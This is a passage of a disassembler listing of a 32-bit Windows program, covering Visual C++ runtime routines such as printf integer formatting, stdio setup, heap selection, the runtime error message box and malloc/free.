; ---------------------------------------------------------------------------

loc_401A5C:				; CODE XREF: sub_40152A+524j
		test	byte ptr [ebp+var_4], 20h
		jz	short loc_401A83
		test	byte ptr [ebp+var_4], 40h
		lea	eax, [ebp+arg_8]
		push	eax
		jz	short loc_401A78
		call	_get_int_arg
		pop	ecx
		movsx	eax, ax

loc_401A75:				; CODE XREF: sub_40152A+557j
					; sub_40152A+569j
		cdq
		jmp	short loc_401A9D
; ---------------------------------------------------------------------------

loc_401A78:				; CODE XREF: sub_40152A+540j
		call	_get_int_arg
		pop	ecx
		movzx	eax, ax
		jmp	short loc_401A75
; ---------------------------------------------------------------------------

loc_401A83:				; CODE XREF: sub_40152A+536j
		test	byte ptr [ebp+var_4], 40h
		lea	eax, [ebp+arg_8]
		push	eax
		jz	short loc_401A95
		call	_get_int_arg
		pop	ecx
		jmp	short loc_401A75
; ---------------------------------------------------------------------------

loc_401A95:				; CODE XREF: sub_40152A+561j
		call	_get_int_arg
		pop	ecx
		xor	edx, edx

loc_401A9D:				; CODE XREF: sub_40152A+530j
					; sub_40152A+54Cj
		test	byte ptr [ebp+var_4], 40h
		jz	short loc_401AC0
		test	edx, edx
		jg	short loc_401AC0
		jl	short loc_401AAD
		test	eax, eax
		jnb	short loc_401AC0

loc_401AAD:				; CODE XREF: sub_40152A+57Dj
		neg	eax
		adc	edx, 0
		mov	[ebp+var_20], eax
		neg	edx
		or	byte ptr [ebp+var_4+1],	1
		mov	[ebp+var_1C], edx
		jmp	short loc_401AC6
; ---------------------------------------------------------------------------

loc_401AC0:				; CODE XREF: sub_40152A+577j
					; sub_40152A+57Bj ...
		mov	[ebp+var_20], eax
		mov	[ebp+var_1C], edx

loc_401AC6:				; CODE XREF: sub_40152A+594j
		test	byte ptr [ebp+var_4+1],	80h
		jnz	short loc_401AD0
		and	[ebp+var_1C], 0

loc_401AD0:				; CODE XREF: sub_40152A+5A0j
		cmp	[ebp+var_8], 0
		jge	short loc_401ADF
		mov	[ebp+var_8], 1
		jmp	short loc_401AF0
; ---------------------------------------------------------------------------

loc_401ADF:				; CODE XREF: sub_40152A+5AAj
		and	[ebp+var_4], 0FFFFFFF7h
		mov	eax, 200h
		cmp	[ebp+var_8], eax
		jle	short loc_401AF0
		mov	[ebp+var_8], eax

loc_401AF0:				; CODE XREF: sub_40152A+5B3j
					; sub_40152A+5C1j
		mov	eax, [ebp+var_20]
		or	eax, [ebp+var_1C]
		jnz	short loc_401AFC
		and	[ebp+var_24], 0

loc_401AFC:				; CODE XREF: sub_40152A+5CCj
		lea	eax, [ebp+var_4D]
		mov	[ebp+var_C], eax

loc_401B02:				; CODE XREF: sub_40152A+627j
		mov	eax, [ebp+var_8]
		dec	[ebp+var_8]
		test	eax, eax
		jg	short loc_401B14
		mov	eax, [ebp+var_20]
		or	eax, [ebp+var_1C]
		jz	short loc_401B53

loc_401B14:				; CODE XREF: sub_40152A+5E0j
		mov	eax, [ebp+var_10]
		cdq
		mov	edi, edx
		mov	esi, eax
		push	edi
		push	esi
		push	[ebp+var_1C]
		push	[ebp+var_20]
		call	__aullrem
		push	edi
		push	esi
		push	[ebp+var_1C]
		mov	ebx, eax
		add	ebx, 30h
		push	[ebp+var_20]
		call	__aulldiv
		cmp	ebx, 39h
		mov	[ebp+var_20], eax
		mov	[ebp+var_1C], edx
		jle	short loc_401B49
		add	ebx, [ebp+var_34]

loc_401B49:				; CODE XREF: sub_40152A+61Aj
		mov	eax, [ebp+var_C]
		dec	[ebp+var_C]
		mov	[eax], bl
		jmp	short loc_401B02
; ---------------------------------------------------------------------------

loc_401B53:				; CODE XREF: sub_40152A+5E8j
		lea	eax, [ebp+var_4D]
		sub	eax, [ebp+var_C]
		inc	[ebp+var_C]
		test	byte ptr [ebp+var_4+1],	2
		mov	[ebp+var_10], eax
		jz	short loc_401B7E
		mov	ecx, [ebp+var_C]
		cmp	byte ptr [ecx],	30h
		jnz	short loc_401B71
		test	eax, eax
		jnz	short loc_401B7E

loc_401B71:				; CODE XREF: sub_40152A+641j
		dec	[ebp+var_C]
		inc	eax
		mov	ecx, [ebp+var_C]
		mov	byte ptr [ecx],	30h

loc_401B7B:				; CODE XREF: sub_40152A+374j
					; sub_40152A+437j ...
		mov	[ebp+var_10], eax

loc_401B7E:				; CODE XREF: sub_40152A+230j
					; sub_40152A+313j ...
		cmp	[ebp+var_38], 0
		jnz	loc_401C7C
		mov	ebx, [ebp+var_4]
		test	bl, 40h
		jz	short loc_401BB6
		test	bh, 1
		jz	short loc_401B9B
		mov	byte ptr [ebp+var_16], 2Dh
		jmp	short loc_401BAF
; ---------------------------------------------------------------------------

loc_401B9B:				; CODE XREF: sub_40152A+669j
		test	bl, 1
		jz	short loc_401BA6
		mov	byte ptr [ebp+var_16], 2Bh
		jmp	short loc_401BAF
; ---------------------------------------------------------------------------

loc_401BA6:				; CODE XREF: sub_40152A+674j
		test	bl, 2
		jz	short loc_401BB6
		mov	byte ptr [ebp+var_16], 20h

loc_401BAF:				; CODE XREF: sub_40152A+66Fj
					; sub_40152A+67Aj
		mov	[ebp+var_24], 1

loc_401BB6:				; CODE XREF: sub_40152A+664j
					; sub_40152A+67Fj
		mov	esi, [ebp+var_28]
		sub	esi, [ebp+var_24]
		sub	esi, [ebp+var_10]
		test	bl, 0Ch
		jnz	short loc_401BD6
		lea	eax, [ebp+var_16+2]
		push	eax		; int
		push	[ebp+arg_0]	; FILE *
		push	esi		; int
		push	20h		; int
		call	_write_multi_char
		add	esp, 10h

loc_401BD6:				; CODE XREF: sub_40152A+698j
		lea	eax, [ebp+var_16+2]
		push	eax		; int
		lea	eax, [ebp+var_16]
		push	[ebp+arg_0]	; FILE *
		push	[ebp+var_24]	; int
		push	eax		; int
		call	_write_string
		add	esp, 10h
		test	bl, 8
		jz	short loc_401C08
		test	bl, 4
		jnz	short loc_401C08
		lea	eax, [ebp+var_16+2]
		push	eax		; int
		push	[ebp+arg_0]	; FILE *
		push	esi		; int
		push	30h		; int
		call	_write_multi_char
		add	esp, 10h

loc_401C08:				; CODE XREF: sub_40152A+6C5j
					; sub_40152A+6CAj
		cmp	[ebp+var_2C], 0
		jz	short loc_401C4F
		cmp	[ebp+var_10], 0
		jle	short loc_401C4F
		mov	eax, [ebp+var_10]
		mov	ebx, [ebp+var_C]
		lea	edi, [eax-1]

loc_401C1D:				; CODE XREF: sub_40152A+721j
		mov	ax, [ebx]
		inc	ebx
		push	eax		; wchar_t
		lea	eax, [ebp+var_44]
		push	eax		; char *
		inc	ebx
		call	_wctomb
		pop	ecx
		test	eax, eax
		pop	ecx
		jle	short loc_401C64
		lea	ecx, [ebp+var_16+2]
		push	ecx		; int
		push	[ebp+arg_0]	; FILE *
		push	eax		; int
		lea	eax, [ebp+var_44]
		push	eax		; int
		call	_write_string
		add	esp, 10h
		mov	eax, edi
		dec	edi
		test	eax, eax
		jnz	short loc_401C1D
		jmp	short loc_401C64
; ---------------------------------------------------------------------------

loc_401C4F:				; CODE XREF: sub_40152A+6E2j
					; sub_40152A+6E8j
		lea	eax, [ebp+var_16+2]
		push	eax		; int
		push	[ebp+arg_0]	; FILE *
		push	[ebp+var_10]	; int
		push	[ebp+var_C]	; int
		call	_write_string
		add	esp, 10h

loc_401C64:				; CODE XREF: sub_40152A+706j
					; sub_40152A+723j
		test	byte ptr [ebp+var_4], 4
		jz	short loc_401C7C
		lea	eax, [ebp+var_16+2]
		push	eax		; int
		push	[ebp+arg_0]	; FILE *
		push	esi		; int
		push	20h		; int
		call	_write_multi_char
		add	esp, 10h

loc_401C7C:				; CODE XREF: sub_40152A+510j
					; sub_40152A+658j ...
		cmp	[ebp+lpMem], 0
		jz	short loc_401C8F ; jumptable 004015A6 default case
		push	[ebp+lpMem]	; lpMem
		call	sub_402EDD
		and	[ebp+lpMem], 0
		pop	ecx

loc_401C8F:				; CODE XREF: sub_40152A+76j
					; sub_40152A+9Bj ...
		mov	esi, [ebp+arg_4] ; jumptable 004015A6 default case
		mov	bl, [esi]
		inc	esi
		test	bl, bl
		mov	[ebp+arg_4], esi
		jnz	loc_40155E

loc_401CA0:				; CODE XREF: sub_40152A+22j
					; sub_40152A+45j
		mov	eax, [ebp+var_16+2]
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_40152A	endp

; ---------------------------------------------------------------------------
off_401CA8	dd offset loc_4016DD	; DATA XREF: sub_40152A+7Cr
		dd offset loc_4015AD	; jump table for switch	statement
		dd offset loc_4015CA
		dd offset loc_401616
		dd offset loc_40164D
		dd offset loc_401656
		dd offset loc_40168E
		dd offset loc_401722
; [00000035 BYTES: COLLAPSED FUNCTION _write_char. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000031 BYTES: COLLAPSED FUNCTION _write_multi_char. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000038 BYTES: COLLAPSED FUNCTION _write_string. PRESS CTRL-NUMPAD+	TO EXPAND]
; [0000000D BYTES: COLLAPSED FUNCTION _get_int_arg. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000010 BYTES: COLLAPSED FUNCTION _get_int64_arg. PRESS CTRL-NUMPAD+ TO EXPAND]
; [0000000E BYTES: COLLAPSED FUNCTION _get_short_arg. PRESS CTRL-NUMPAD+ TO EXPAND]
; ---------------------------------------------------------------------------

___initstdio:
		mov	eax, dword_40AFC0
		push	esi
		push	14h
		test	eax, eax
		pop	esi
		jnz	short loc_401DA5
		mov	eax, 200h
		jmp	short loc_401DAB
; ---------------------------------------------------------------------------

loc_401DA5:				; CODE XREF: .text:00401D9Cj
		cmp	eax, esi
		jge	short loc_401DB0
		mov	eax, esi

loc_401DAB:				; CODE XREF: .text:00401DA3j
		mov	dword_40AFC0, eax

loc_401DB0:				; CODE XREF: .text:00401DA7j
		push	4
		push	eax
		call	sub_403125
		pop	ecx
		mov	dword_409FB8, eax
		test	eax, eax
		pop	ecx
		jnz	short loc_401DE4
		push	4
		push	esi
		mov	dword_40AFC0, esi
		call	sub_403125
		pop	ecx
		mov	dword_409FB8, eax
		test	eax, eax
		pop	ecx
		jnz	short loc_401DE4
		push	1Ah
		call	__amsg_exit
; ---------------------------------------------------------------------------
		db  59h	; Y
; ---------------------------------------------------------------------------

loc_401DE4:				; CODE XREF: .text:00401DC1j
					; .text:00401DDAj
		xor	ecx, ecx
		mov	eax, offset off_4071F0

loc_401DEB:				; CODE XREF: .text:00401DFFj
		mov	edx, dword_409FB8
		mov	[ecx+edx], eax
		add	eax, 20h
		add	ecx, 4
		cmp	eax, offset dword_407470
		jl	short loc_401DEB
		xor	edx, edx
		mov	ecx, offset unk_407200

loc_401E08:				; CODE XREF: .text:00401E32j
		mov	eax, edx
		mov	esi, edx
		sar	eax, 5
		and	esi, 1Fh
		mov	eax, dword_409EA0[eax*4]
		mov	eax, [eax+esi*8]
		cmp	eax, 0FFFFFFFFh
		jz	short loc_401E25
		test	eax, eax
		jnz	short loc_401E28

loc_401E25:				; CODE XREF: .text:00401E1Fj
		or	dword ptr [ecx], 0FFFFFFFFh

loc_401E28:				; CODE XREF: .text:00401E23j
		add	ecx, 20h
		inc	edx
		cmp	ecx, offset unk_407260
		jl	short loc_401E08
		pop	esi
		retn
; ---------------------------------------------------------------------------

___endstdio:
		call	sub_402E67
		cmp	byte_409AE8, 0
		jz	short locret_401E49
		jmp	__fcloseall
; ---------------------------------------------------------------------------

locret_401E49:				; CODE XREF: .text:00401E42j
		retn
; [00000115 BYTES: COLLAPSED FUNCTION __flsbuf.	PRESS CTRL-NUMPAD+ TO EXPAND]
; [0000002D BYTES: COLLAPSED FUNCTION __cinit. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION _exit. PRESS CTRL-NUMPAD+	TO EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION __exit. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000099 BYTES: COLLAPSED FUNCTION _doexit. PRESS CTRL-NUMPAD+ TO EXPAND]
; [0000001A BYTES: COLLAPSED FUNCTION __initterm. PRESS	CTRL-NUMPAD+ TO	EXPAND]
; [00000141 BYTES: COLLAPSED FUNCTION __XcptFilter. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000043 BYTES: COLLAPSED FUNCTION _xcptlookup. PRESS CTRL-NUMPAD+ TO EXPAND]
; [000000B9 BYTES: COLLAPSED FUNCTION __setenvp. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000099 BYTES: COLLAPSED FUNCTION __setargv. PRESS CTRL-NUMPAD+ TO EXPAND]
; [000001B4 BYTES: COLLAPSED FUNCTION _parse_cmdline. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000132 BYTES: COLLAPSED FUNCTION ___crtGetEnvironmentStringsA. PRESS CTRL-NUMPAD+ TO EXPAND]
; [000001AB BYTES: COLLAPSED FUNCTION __ioinit.	PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_4027C8	proc near		; CODE XREF: sub_4027F5+136p

arg_0		= dword	ptr  4

		push	esi
		mov	esi, [esp+4+arg_0]
		push	0		; lpModuleName
		and	dword ptr [esi], 0
		call	ds:GetModuleHandleA
		cmp	word ptr [eax],	5A4Dh
		jnz	short loc_4027F3
		mov	ecx, [eax+3Ch]
		test	ecx, ecx
		jz	short loc_4027F3
		add	eax, ecx
		mov	cl, [eax+1Ah]
		mov	[esi], cl
		mov	al, [eax+1Bh]
		mov	[esi+1], al

loc_4027F3:				; CODE XREF: sub_4027C8+15j
					; sub_4027C8+1Cj
		pop	esi
		retn
sub_4027C8	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4027F5	proc near		; CODE XREF: sub_40293D+20p

Buffer		= byte ptr -122Ch
Filename	= byte ptr -19Ch
VersionInformation= _OSVERSIONINFOA ptr	-98h
var_4		= byte ptr -4

		push	ebp
		mov	ebp, esp
		mov	eax, 122Ch
		call	__alloca_probe
		lea	eax, [ebp+VersionInformation]
		push	ebx
		push	eax		; lpVersionInformation
		mov	[ebp+VersionInformation.dwOSVersionInfoSize], 94h
		call	ds:GetVersionExA
		test	eax, eax
		jz	short loc_402838
		cmp	[ebp+VersionInformation.dwPlatformId], 2
		jnz	short loc_402838
		cmp	[ebp+VersionInformation.dwMajorVersion], 5
		jb	short loc_402838
		push	1
		pop	eax
		jmp	loc_40293A
; ---------------------------------------------------------------------------

loc_402838:				; CODE XREF: sub_4027F5+27j
					; sub_4027F5+30j ...
		lea	eax, [ebp+Buffer]
		push	1090h		; nSize
		push	eax		; lpBuffer
		push	offset Name	; "__MSVCRT_HEAP_SELECT"
		call	ds:GetEnvironmentVariableA
		test	eax, eax
		jz	loc_402927
		xor	ebx, ebx
		lea	ecx, [ebp+Buffer]
		cmp	[ebp+Buffer], bl
		jz	short loc_40287A

loc_402867:				; CODE XREF: sub_4027F5+83j
		mov	al, [ecx]
		cmp	al, 61h
		jl	short loc_402875
		cmp	al, 7Ah
		jg	short loc_402875
		sub	al, 20h
		mov	[ecx], al

loc_402875:				; CODE XREF: sub_4027F5+76j
					; sub_4027F5+7Aj
		inc	ecx
		cmp	[ecx], bl
		jnz	short loc_402867

loc_40287A:				; CODE XREF: sub_4027F5+70j
		lea	eax, [ebp+Buffer]
		push	16h		; size_t
		push	eax		; char *
		push	offset a__global_heap_ ; "__GLOBAL_HEAP_SELECTED"
		call	_strncmp
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_40289C
		lea	eax, [ebp+Buffer]
		jmp	short loc_4028E5
; ---------------------------------------------------------------------------

loc_40289C:				; CODE XREF: sub_4027F5+9Dj
		lea	eax, [ebp+Filename]
		push	104h		; nSize
		push	eax		; lpFilename
		push	ebx		; hModule
		call	ds:GetModuleFileNameA
		cmp	[ebp+Filename],	bl
		lea	ecx, [ebp+Filename]
		jz	short loc_4028D0

loc_4028BD:				; CODE XREF: sub_4027F5+D9j
		mov	al, [ecx]
		cmp	al, 61h
		jl	short loc_4028CB
		cmp	al, 7Ah
		jg	short loc_4028CB
		sub	al, 20h
		mov	[ecx], al

loc_4028CB:				; CODE XREF: sub_4027F5+CCj
					; sub_4027F5+D0j
		inc	ecx
		cmp	[ecx], bl
		jnz	short loc_4028BD

loc_4028D0:				; CODE XREF: sub_4027F5+C6j
		lea	eax, [ebp+Filename]
		push	eax		; char *
		lea	eax, [ebp+Buffer]
		push	eax		; char *
		call	_strstr
		pop	ecx
		pop	ecx

loc_4028E5:				; CODE XREF: sub_4027F5+A5j
		cmp	eax, ebx
		jz	short loc_402927
		push	2Ch		; int
		push	eax		; char *
		call	_strchr
		pop	ecx
		cmp	eax, ebx
		pop	ecx
		jz	short loc_402927
		inc	eax
		mov	ecx, eax
		cmp	[eax], bl
		jz	short loc_40290C

loc_4028FE:				; CODE XREF: sub_4027F5+115j
		cmp	byte ptr [ecx],	3Bh
		jnz	short loc_402907
		mov	[ecx], bl
		jmp	short loc_402908
; ---------------------------------------------------------------------------

loc_402907:				; CODE XREF: sub_4027F5+10Cj
		inc	ecx

loc_402908:				; CODE XREF: sub_4027F5+110j
		cmp	[ecx], bl
		jnz	short loc_4028FE

loc_40290C:				; CODE XREF: sub_4027F5+107j
		push	0Ah		; int
		push	ebx		; char **
		push	eax		; char *
		call	_strtol
		add	esp, 0Ch
		cmp	eax, 2
		jz	short loc_40293A
		cmp	eax, 3
		jz	short loc_40293A
		cmp	eax, 1
		jz	short loc_40293A

loc_402927:				; CODE XREF: sub_4027F5+5Cj
					; sub_4027F5+F2j ...
		lea	eax, [ebp+var_4]
		push	eax
		call	sub_4027C8
		cmp	[ebp+var_4], 6
		pop	ecx
		sbb	eax, eax
		add	eax, 3

loc_40293A:				; CODE XREF: sub_4027F5+3Ej
					; sub_4027F5+126j ...
		pop	ebx
		leave
		retn
sub_4027F5	endp


; =============== S U B	R O U T	I N E =======================================


sub_40293D	proc near		; CODE XREF: start+59p

arg_0		= dword	ptr  4

		xor	eax, eax
		push	0		; dwMaximumSize
		cmp	[esp+4+arg_0], eax
		push	1000h		; dwInitialSize
		setz	al
		push	eax		; flOptions
		call	ds:HeapCreate
		test	eax, eax
		mov	hHeap, eax
		jz	short loc_402993
		call	sub_4027F5
		cmp	eax, 3
		mov	dword_409E8C, eax
		jnz	short loc_402979
		push	3F8h
		call	___sbh_heap_init
		pop	ecx
		jmp	short loc_402983
; ---------------------------------------------------------------------------

loc_402979:				; CODE XREF: sub_40293D+2Dj
		cmp	eax, 2
		jnz	short loc_402996
		call	sub_404900

loc_402983:				; CODE XREF: sub_40293D+3Aj
		test	eax, eax
		jnz	short loc_402996
		push	hHeap		; hHeap
		call	ds:HeapDestroy

loc_402993:				; CODE XREF: sub_40293D+1Ej
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_402996:				; CODE XREF: sub_40293D+3Fj
					; sub_40293D+48j
		push	1
		pop	eax
		retn
sub_40293D	endp

; ---------------------------------------------------------------------------
		align 4
; [00000020 BYTES: COLLAPSED FUNCTION __global_unwind2.	PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000022 BYTES: COLLAPSED FUNCTION __unwind_handler.	PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000068 BYTES: COLLAPSED FUNCTION __local_unwind2. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000022 BYTES: COLLAPSED FUNCTION __abnormal_termination. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000001 BYTES: COLLAPSED FUNCTION _at_done.	PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000009 BYTES: COLLAPSED FUNCTION __NLG_Notify1. PRESS CTRL-NUMPAD+	TO EXPAND]
; [00000018 BYTES: COLLAPSED FUNCTION __NLG_Notify. PRESS CTRL-NUMPAD+ TO EXPAND]
		align 4
		push	esi
		inc	ebx
		xor	dh, [eax]
		pop	eax
		inc	ebx
		xor	[eax], dh
; [000000BD BYTES: COLLAPSED FUNCTION __except_handler3. PRESS CTRL-NUMPAD+ TO EXPAND]
; [0000001B BYTES: COLLAPSED FUNCTION _seh_longjmp_unwind(x). PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000039 BYTES: COLLAPSED FUNCTION __FF_MSGBANNER. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_402BA5(DWORD NumberOfBytesWritten)
sub_402BA5	proc near		; CODE XREF: __amsg_exit+12p
					; _fast_error_exit+12p	...

Filename	= byte ptr -1A4h
var_A0		= byte ptr -0A0h
NumberOfBytesWritten= dword ptr	 8

		push	ebp
		mov	ebp, esp
		sub	esp, 1A4h
		mov	edx, [ebp+NumberOfBytesWritten]
		xor	ecx, ecx
		mov	eax, offset dword_407518

loc_402BB8:				; CODE XREF: sub_402BA5+20j
		cmp	edx, [eax]
		jz	short loc_402BC7
		add	eax, 8
		inc	ecx
		cmp	eax, offset unk_4075A8
		jb	short loc_402BB8

loc_402BC7:				; CODE XREF: sub_402BA5+15j
		push	esi
		mov	esi, ecx
		shl	esi, 3
		cmp	edx, dword_407518[esi]
		jnz	loc_402CF5
		mov	eax, dword_409A98
		cmp	eax, 1
		jz	loc_402CCF
		test	eax, eax
		jnz	short loc_402BF8
		cmp	dword_4071E0, 1
		jz	loc_402CCF

loc_402BF8:				; CODE XREF: sub_402BA5+44j
		cmp	edx, 0FCh
		jz	loc_402CF5
		lea	eax, [ebp+Filename]
		push	104h		; nSize
		push	eax		; lpFilename
		push	0		; hModule
		call	ds:GetModuleFileNameA
		test	eax, eax
		jnz	short loc_402C2F
		lea	eax, [ebp+Filename]
		push	offset aProgramNameUnk ; "<program name	unknown>"
		push	eax		; char *
		call	_strcpy
		pop	ecx
		pop	ecx

loc_402C2F:				; CODE XREF: sub_402BA5+75j
		lea	eax, [ebp+Filename]
		push	edi
		push	eax		; char *
		lea	edi, [ebp+Filename]
		call	_strlen
		inc	eax
		pop	ecx
		cmp	eax, 3Ch
		jbe	short loc_402C72
		lea	eax, [ebp+Filename]
		push	eax		; char *
		call	_strlen
		mov	edi, eax
		lea	eax, [ebp+Filename]
		sub	eax, 3Bh
		push	3		; size_t
		add	edi, eax
		push	offset a___	; "..."
		push	edi		; char *
		call	_strncpy
		add	esp, 10h

loc_402C72:				; CODE XREF: sub_402BA5+A2j
		lea	eax, [ebp+var_A0]
		push	offset aRuntimeErrorPr ; "Runtime Error!\n\nProgram: "
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_A0]
		push	edi		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_A0]
		push	offset asc_40644C ; "\n\n"
		push	eax		; char *
		call	_strcat
		push	off_40751C[esi]	; char *
		lea	eax, [ebp+var_A0]
		push	eax		; char *
		call	_strcat
		push	12010h
		lea	eax, [ebp+var_A0]
		push	offset aMicrosoftVisua ; "Microsoft Visual C++ Runtime Library"
		push	eax
		call	___crtMessageBoxA
		add	esp, 2Ch
		pop	edi
		jmp	short loc_402CF5
; ---------------------------------------------------------------------------

loc_402CCF:				; CODE XREF: sub_402BA5+3Cj
					; sub_402BA5+4Dj
		lea	eax, [ebp+NumberOfBytesWritten]
		lea	esi, off_40751C[esi]
		push	0		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		push	dword ptr [esi]	; char *
		call	_strlen
		pop	ecx
		push	eax		; nNumberOfBytesToWrite
		push	dword ptr [esi]	; lpBuffer
		push	0FFFFFFF4h	; nStdHandle
		call	ds:GetStdHandle
		push	eax		; hFile
		call	ds:WriteFile

loc_402CF5:				; CODE XREF: sub_402BA5+2Ej
					; sub_402BA5+59j ...
		pop	esi
		leave
		retn
sub_402BA5	endp

; [00000012 BYTES: COLLAPSED FUNCTION _malloc. PRESS CTRL-NUMPAD+ TO EXPAND]
; [0000002C BYTES: COLLAPSED FUNCTION __nh_malloc. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_402D36	proc near		; CODE XREF: __nh_malloc+Bp

arg_0		= dword	ptr  4

		mov	eax, dword_409E8C
		push	esi
		mov	esi, [esp+4+arg_0]
		cmp	eax, 3
		jnz	short loc_402D5A
		cmp	esi, dword_409C60
		ja	short loc_402D8C
		push	esi
		call	___sbh_alloc_block
		test	eax, eax
		pop	ecx
		jz	short loc_402D8C
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_402D5A:				; CODE XREF: sub_402D36+Dj
		cmp	eax, 2
		jnz	short loc_402D8C
		mov	eax, [esp+4+arg_0]
		test	eax, eax
		jz	short loc_402D6F
		lea	esi, [eax+0Fh]
		and	esi, 0FFFFFFF0h
		jmp	short loc_402D72
; ---------------------------------------------------------------------------

loc_402D6F:				; CODE XREF: sub_402D36+2Fj
		push	10h
		pop	esi

loc_402D72:				; CODE XREF: sub_402D36+37j
		cmp	esi, dword_409904
		ja	short loc_402D99
		mov	eax, esi
		shr	eax, 4
		push	eax
		call	sub_404BF8
		test	eax, eax
		pop	ecx
		jnz	short loc_402DA8
		jmp	short loc_402D99
; ---------------------------------------------------------------------------

loc_402D8C:				; CODE XREF: sub_402D36+15j
					; sub_402D36+20j ...
		test	esi, esi
		jnz	short loc_402D93
		push	1
		pop	esi

loc_402D93:				; CODE XREF: sub_402D36+58j
		add	esi, 0Fh
		and	esi, 0FFFFFFF0h

loc_402D99:				; CODE XREF: sub_402D36+42j
					; sub_402D36+54j
		push	esi		; dwBytes
		push	0		; dwFlags
		push	hHeap		; hHeap
		call	ds:HeapAlloc

loc_402DA8:				; CODE XREF: sub_402D36+52j
		pop	esi
		retn
sub_402D36	endp

; [00000026 BYTES: COLLAPSED FUNCTION __isatty.	PRESS CTRL-NUMPAD+ TO EXPAND]
; [0000003B BYTES: COLLAPSED FUNCTION _fflush. PRESS CTRL-NUMPAD+ TO EXPAND]
; [0000005C BYTES: COLLAPSED FUNCTION __flush. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_402E67	proc near		; CODE XREF: .text:___endstdiop
		push	1
		call	_flsall
		pop	ecx
		retn
sub_402E67	endp

; [0000006D BYTES: COLLAPSED FUNCTION _flsall. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_402EDD(LPVOID	lpMem)
sub_402EDD	proc near		; CODE XREF: sub_40152A+75Bp
					; __setenvp+9Dp ...

var_4		= dword	ptr -4
lpMem		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		mov	esi, [ebp+lpMem]
		test	esi, esi
		jz	short loc_402F43
		mov	eax, dword_409E8C
		cmp	eax, 3
		jnz	short loc_402F09
		push	esi
		call	___sbh_find_block
		pop	ecx
		test	eax, eax
		push	esi
		jz	short loc_402F35
		push	eax
		call	sub_404122
		pop	ecx
		pop	ecx
		jmp	short loc_402F43
; ---------------------------------------------------------------------------

loc_402F09:				; CODE XREF: sub_402EDD+14j
		cmp	eax, 2
		jnz	short loc_402F34
		lea	eax, [ebp+lpMem]
		push	eax
		lea	eax, [ebp+var_4]
		push	eax
		push	esi
		call	sub_404B5C
		add	esp, 0Ch
		test	eax, eax
		jz	short loc_402F34
		push	eax
		push	[ebp+lpMem]
		push	[ebp+var_4]
		call	sub_404BB3
		add	esp, 0Ch
		jmp	short loc_402F43
; ---------------------------------------------------------------------------

loc_402F34:				; CODE XREF: sub_402EDD+2Fj
					; sub_402EDD+44j
		push	esi		; lpMem

loc_402F35:				; CODE XREF: sub_402EDD+20j
		push	0		; dwFlags
		push	hHeap		; hHeap
		call	ds:HeapFree

loc_402F43:				; CODE XREF: sub_402EDD+Aj
					; sub_402EDD+2Aj ...
		pop	esi
		leave
		retn
sub_402EDD	endp

; ---------------------------------------------------------------------------
		align 10h
; [0000007B BYTES: COLLAPSED FUNCTION _strlen. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000068 BYTES: COLLAPSED FUNCTION _wctomb. PRESS CTRL-NUMPAD+ TO EXPAND]
		align 10h
; [00000068 BYTES: COLLAPSED FUNCTION __aulldiv. PRESS CTRL-NUMPAD+ TO EXPAND]
		align 10h
; [00000075 BYTES: COLLAPSED FUNCTION __aullrem. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_403125(size_t, int)
sub_403125	proc near		; CODE XREF: .text:00401DB3p
					; .text:00401DCCp

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+arg_0]
		imul	esi, [ebp+arg_4]
		cmp	esi, 0FFFFFFE0h
		push	edi
		mov	[ebp+arg_0], esi
		ja	short loc_403146
		test	esi, esi
		jnz	short loc_403140
		push	1
		pop	esi

loc_403140:				; CODE XREF: sub_403125+16j
		add	esi, 0Fh
		and	esi, 0FFFFFFF0h

loc_403146:				; CODE XREF: sub_403125+12j
					; sub_403125+94j
		xor	edi, edi
		cmp	esi, 0FFFFFFE0h
		ja	short loc_4031A5
		mov	eax, dword_409E8C
		cmp	eax, 3
		jnz	short loc_403171
		mov	eax, [ebp+arg_0]
		cmp	eax, dword_409C60
		ja	short loc_403190
		push	eax
		call	___sbh_alloc_block
		mov	edi, eax
		pop	ecx
		test	edi, edi
		jnz	short loc_4031BB
		jmp	short loc_403190
; ---------------------------------------------------------------------------

loc_403171:				; CODE XREF: sub_403125+30j
		cmp	eax, 2
		jnz	short loc_403190
		cmp	esi, dword_409904
		ja	short loc_403190
		mov	eax, esi
		shr	eax, 4
		push	eax
		call	sub_404BF8
		mov	edi, eax
		pop	ecx
		test	edi, edi
		jnz	short loc_4031CF

loc_403190:				; CODE XREF: sub_403125+3Bj
